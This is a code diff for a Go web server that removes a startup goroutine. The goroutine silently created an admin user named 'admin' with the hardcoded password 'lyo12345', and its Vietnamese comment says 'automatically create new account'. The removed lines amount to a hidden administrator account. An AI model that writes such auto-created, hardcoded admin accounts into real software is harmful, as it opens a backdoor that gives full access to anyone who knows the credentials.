@@ -166,14 +166,7 @@ func main() {
 	stmt_update_pwd, err = db.Prepare("UPDATE users SET pwd_hash = ?, pwd_salt = ? WHERE username = ?")
 
 	stmt_list_every_users, err = db.Prepare("SELECT username, is_admin FROM users")
-	// TỰ ĐỘNG TẠO TÀI KHOẢN MỚI
-	go func() {
-		time.Sleep(2 * time.Second)
-		myUser := "admin"                   // <--- Username dì muốn
-		myPass := "lyo12345"                // <--- Password dì muốn
-		hash, salt := hashWithRandomSalt([]byte(myPass))
-		stmt_create_user.Exec(myUser, hash, salt, 1)
-	}()
+
 
 	r := gin.Default()
 
